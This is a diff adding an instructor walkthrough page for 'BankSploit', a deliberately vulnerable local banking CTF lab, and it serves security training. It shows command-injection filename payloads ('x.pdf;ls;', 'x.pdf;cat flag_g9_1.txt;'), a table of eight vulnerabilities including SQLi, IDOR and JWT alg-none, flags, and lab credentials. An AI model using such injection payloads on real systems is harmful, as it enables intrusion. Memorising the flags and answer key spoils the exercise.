+        <h3>Vulnerability Description</h3>
+        <p>The "Download PDF" feature passes the filename parameter into a shell command without sanitization. Injecting a semicolon (<code>;</code>) allows running arbitrary commands — including listing files and reading a hidden flag file planted on the server.</p>
+
+        <h3>Exploitation Steps</h3>
+
+        <div class="step">
+            <span class="step-num">1</span>
+            <span class="step-label">Find the PDF export on the Statements page</span>
+            <p>Navigate to <strong>Statements</strong>. Look for the <strong>"PDF file name"</strong> input field (default: <code>statement.pdf</code>) and <strong>"Download PDF"</strong> button.</p>
+        </div>
+
+        <div class="step">
+            <span class="step-num">2</span>
+            <span class="step-label">Inject a command to discover files</span>
+            <p>Change the filename to:</p>
+            <pre>x.pdf;ls;</pre>
+            <p>Click <strong>Download PDF</strong>. The browser shows JSON output with a file listing. Look for <code>flag_g9_1.txt</code>.</p>
+        </div>
+
+        <div class="step">
+            <span class="step-num">3</span>
+            <span class="step-label">Read the flag file</span>
+            <p>Go back, change the filename to:</p>
+            <pre>x.pdf;cat flag_g9_1.txt;</pre>
+            <p>Click <strong>Download PDF</strong>.</p>
+        </div>
+
+        <div class="step">
+            <span class="step-num">4</span>
+            <span class="step-label">Flag is in the command output</span>
+            <pre>{
+  "ok": true,
+  "output": "Generated PDF: .../x.pdf\n<span class="flag">BANKSPLOIT{4F2CFE06F9DF}</span>\n"
+}</pre>
+        </div>
+
+        <div class="note-box">
+            <span class="icon">💡</span> <strong>Two-step approach:</strong> First <code>ls</code> to discover file names (you don't know what they're called), then <code>cat</code> to read. This mirrors real-world RCE exploitation: enumerate → extract.
+        </div>
+
+        <div class="flag-box">
+            <span class="icon">🚩</span>
+            <span class="flag-value">BANKSPLOIT{4F2CFE06F9DF}</span>
+            <span class="flag-status">✓ Read from flag file via command injection</span>
+        </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <!-- FLAG SUBMISSION -->
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <div class="vuln-section" style="border-color: var(--green);">
+        <div class="vuln-header">
+            <span class="vuln-title" style="color: var(--green);">✅ How to Submit Flags</span>
+        </div>
+
+        <h3>Using the Flag Submission Page</h3>
+        <div class="step">
+            <span class="step-num">1</span>
+            <span class="step-label">Navigate to the Flag Submission page</span>
+            <p>Click <strong>"Flag Submission"</strong> in the left sidebar (under Tools section), or go to <code>http://localhost:9443/lab</code>.</p>
+        </div>
+        <div class="step">
+            <span class="step-num">2</span>
+            <span class="step-label">Paste your flag and submit</span>
+            <p>Paste the flag (<code>BANKSPLOIT{XXXXXXXXXXXX}</code>) into the text input next to the matching vulnerability, then click <strong>Submit</strong>.</p>
+            <p>A green success message confirms: <em>"🚩 Correct! +N pts"</em>.</p>
+        </div>
+
+        <h3>All 8 Flags — Summary</h3>
+        <table style="width:100%; border-collapse:collapse; margin-top:1rem; font-size:0.85rem;">
+            <thead>
+                <tr style="border-bottom:1px solid var(--border); text-align:left;">
+                    <th style="padding:0.5rem; color:var(--muted);">#</th>
+                    <th style="padding:0.5rem; color:var(--muted);">ID</th>
+                    <th style="padding:0.5rem; color:var(--muted);">Vulnerability</th>
+                    <th style="padding:0.5rem; color:var(--muted);">Pts</th>
+                    <th style="padding:0.5rem; color:var(--muted);">Flag Location</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr style="border-bottom:1px solid #1e293b80;">
+                    <td style="padding:0.5rem;">1</td><td style="padding:0.5rem; color:var(--green);">L11</td>
+                    <td style="padding:0.5rem;">OTP Leaked in JavaScript</td>
+                    <td style="padding:0.5rem;">100</td>
+                    <td style="padding:0.5rem; color:var(--muted); font-size:0.8rem;">Inside otp-validation.js → SESSION_DATA._flag</td>
+                </tr>
+                <tr style="border-bottom:1px solid #1e293b80;">
+                    <td style="padding:0.5rem;">2</td><td style="padding:0.5rem; color:var(--blue);">G1</td>
+                    <td style="padding:0.5rem;">SQLi Login Bypass</td>
+                    <td style="padding:0.5rem;">200</td>
+                    <td style="padding:0.5rem; color:var(--muted); font-size:0.8rem;">X-CTF-Flag response header on login POST</td>
+                </tr>
+                <tr style="border-bottom:1px solid #1e293b80;">
+                    <td style="padding:0.5rem;">3</td><td style="padding:0.5rem; color:var(--blue);">L10</td>
+                    <td style="padding:0.5rem;">OTP Brute-Force</td>
+                    <td style="padding:0.5rem;">200</td>
+                    <td style="padding:0.5rem; color:var(--muted); font-size:0.8rem;">JSON response body (ctf_flag field) on correct OTP</td>
+                </tr>
+                <tr style="border-bottom:1px solid #1e293b80;">
+                    <td style="padding:0.5rem;">4</td><td style="padding:0.5rem; color:var(--blue);">SL1</td>
+                    <td style="padding:0.5rem;">IDOR View Statements</td>
+                    <td style="padding:0.5rem;">200</td>
+                    <td style="padding:0.5rem; color:var(--muted); font-size:0.8rem;">X-CTF-Flag response header on /statements page</td>
+                </tr>
+                <tr style="border-bottom:1px solid #1e293b80;">
+                    <td style="padding:0.5rem;">5</td><td style="padding:0.5rem; color:var(--accent);">L1</td>
+                    <td style="padding:0.5rem;">IDOR Transfer</td>
+                    <td style="padding:0.5rem;">300</td>
+                    <td style="padding:0.5rem; color:var(--muted); font-size:0.8rem;">X-CTF-Flag response header on transfer receipt</td>
+                </tr>
+                <tr style="border-bottom:1px solid #1e293b80;">
+                    <td style="padding:0.5rem;">6</td><td style="padding:0.5rem; color:var(--accent);">L12</td>
+                    <td style="padding:0.5rem;">JWT Alg None</td>
+                    <td style="padding:0.5rem;">300</td>
+                    <td style="padding:0.5rem; color:var(--muted); font-size:0.8rem;">JSON response from /api/v1/auth/vault (Console fetch)</td>
+                </tr>
+                <tr style="border-bottom:1px solid #1e293b80;">
+                    <td style="padding:0.5rem;">7</td><td style="padding:0.5rem; color:var(--accent);">G2</td>
+                    <td style="padding:0.5rem;">SQLi UNION Extract</td>
+                    <td style="padding:0.5rem;">300</td>
+                    <td style="padding:0.5rem; color:var(--muted); font-size:0.8rem;">Hex-encoded in HTML table → decode in Console</td>
+                </tr>
+                <tr>
+                    <td style="padding:0.5rem;">8</td><td style="padding:0.5rem; color:var(--accent);">G9</td>
+                    <td style="padding:0.5rem;">Command Injection</td>
+                    <td style="padding:0.5rem;">300</td>
+                    <td style="padding:0.5rem; color:var(--muted); font-size:0.8rem;">In JSON output (browser navigates to PDF export endpoint)</td>
+                </tr>
+            </tbody>
+            <tfoot>
+                <tr style="border-top:2px solid var(--accent);">
+                    <td colspan="4" style="padding:0.75rem; font-weight:700; color:var(--accent);">TOTAL</td>
+                    <td style="padding:0.75rem; font-weight:900; color:var(--green); font-size:1.1rem;">2000 pts</td>
+                </tr>
+            </tfoot>
+        </table>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <!-- NOTES FOR INSTRUCTORS -->
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <div class="vuln-section" style="border-color: var(--purple);">
+        <div class="vuln-header">
+            <span class="vuln-title" style="color: var(--purple);">📝 Notes for Instructors</span>
+        </div>
+
+        <h3>Flag Uniqueness</h3>
+        <p>Flags are <strong>unique per participant</strong> — computed as <code>HMAC-SHA256(user_id + ":" + vuln_key, FLAG_SECRET)</code>. The flags shown in this walkthrough are specific to user_id=1. Each participant gets different values — sharing flags won't work.</p>
+
+        <h3>OTP Delivery (SMS Inbox)</h3>
+        <p>Participants can get the OTP legitimately via the <strong>"📱 Open SMS Inbox"</strong> button on the OTP page, which opens <code>/otp-inbox</code>. This page shows the OTP but <strong>does NOT</strong> reveal the L11 flag. The L11 flag is only discoverable by inspecting the JavaScript file — the SMS Inbox is the "phone" delivery channel, not the vulnerability.</p>
+
+        <h3>No CSRF Tokens</h3>
+        <p>CSRF protection is <strong>disabled</strong> for the CTF. Forms submit without any token — this simplifies exploitation scripts and removes irrelevant friction.</p>
+
+        <h3>JWT Read-Only</h3>
+        <p>Forged JWT tokens can access <strong>read-only pages</strong> (dashboard, statements, cards list) but <strong>cannot perform write operations</strong> (transfers, payments, profile updates). Write endpoints return HTTP 403: "Session authentication required. JWT tokens are read-only." The L12 vault challenge works because it's a GET endpoint.</p>
+
+        <h3>Resetting the Scoreboard</h3>
+        <pre><span class="comment"># Clear all submissions:</span>
+./start.sh reset          <span class="comment">(Mac/Linux)</span>
+.\start.ps1 reset         <span class="comment">(Windows)</span>
+
+<span class="comment"># Full database reset (drops everything, starts fresh):</span>
+./start.sh reset-full
+.\start.ps1 reset-full</pre>
+
+        <h3>Key Credentials</h3>
+        <pre><span class="comment"># Participant login:</span>
+Customer ID: BS100234
+Password:    password123
+
+<span class="comment"># Instructor control panel:</span>
+URL:      http://localhost:8888
+Username: instructor
+Password: instructor@123</pre>
+
+        <h3>Vulnerability Levels</h3>
+        <p>All vulnerabilities must be at <strong>Level 0</strong> (most vulnerable) for this walkthrough to work. Use the Instructor Control Panel to verify and adjust.</p>
+    </div>
+
+    <div class="footer">
+        <p>BankSploit CTF Walkthrough — Browser-only exploitation using DevTools</p>
+        <p>8 challenges · 2000 points · 3 difficulty tiers · No external tools required</p>
+    </div>
+
+</div>
+</body>
+</html>
